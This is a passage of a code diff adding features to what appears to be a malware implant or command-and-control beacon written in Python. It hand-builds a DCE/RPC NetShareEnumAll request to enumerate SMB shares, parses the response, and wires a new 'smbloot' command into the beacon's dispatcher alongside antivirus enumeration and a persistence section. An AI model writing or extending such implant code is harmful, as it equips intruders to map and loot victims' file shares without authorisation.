+        # Level = 1
+        level = struct.pack("<I", 1)
+        # InfoStruct (level 1 container - simplified)
+        info = struct.pack("<III", 1, 0, 0)  # level, switch, pointer
+        # Pointer + ResumeHandle
+        resume = struct.pack("<II", 0xffffffff, 0)  # PreferedMaxLength, ResumeHandle
+        # Reference pointer for server name
+        ref_id = struct.pack("<I", 0x00020000)
+
+        stub = ref_id + ndr_str + level + info + resume
+
+        # RPC Request header
+        hdr = struct.pack("<BBBBIHHI",
+                          5, 0,   # version
+                          0,      # REQUEST
+                          0x03,   # flags
+                          0x10000000,
+                          len(stub) + 24,  # frag_length
+                          0,      # auth_length
+                          1)      # call_id
+        req_hdr = struct.pack("<IHH", len(stub), 0, 15)  # alloc_hint, ctx_id, opnum (NetShareEnumAll=15)
+        return hdr + req_hdr + stub
+
+    @staticmethod
+    def _parse_netshareenumall(data: bytes) -> list:
+        """Parse NetShareEnumAll DCE/RPC response (best-effort)."""
+        shares = []
+        # Find share names in the response by looking for Unicode strings
+        # The response format: RPC header + NDR-encoded ShareInfo1 array
+        idx = data.find(b"\x00" * 4, 24)  # skip RPC header
+        # Simplified: extract null-terminated UTF-16 strings that look like share names
+        i = 24  # skip DCE/RPC header
+        while i < len(data) - 4:
+            # Look for reference ID pattern followed by string data
+            # Share names are typically short Unicode strings
+            if i + 12 < len(data):
+                max_count = struct.unpack_from("<I", data, i)[0]
+                if 1 <= max_count <= 256:
+                    offset_val = struct.unpack_from("<I", data, i + 4)[0]
+                    actual = struct.unpack_from("<I", data, i + 8)[0]
+                    if offset_val == 0 and actual == max_count and actual <= 128:
+                        str_len = actual * 2
+                        if i + 12 + str_len <= len(data):
+                            try:
+                                name = data[i + 12:i + 12 + str_len].decode(
+                                    "utf-16-le").rstrip("\x00")
+                                if name and name.isprintable() and len(name) < 64:
+                                    if not any(s["name"] == name for s in shares):
+                                        shares.append({"name": name, "type": 0, "comment": ""})
+                            except Exception:
+                                pass
+            i += 4
+        return shares
+
     # ── Persistence ──
 
     def _get_beacon_path(self) -> str:
@@ -2386,6 +3140,9 @@ class Beacon:
 
             elif cmd == "avenum":
                 output = self._exec_avenum()
+
+            elif cmd == "smbloot":
+                output = self._exec_smbloot(args)
 
             else:
                 status = "error"
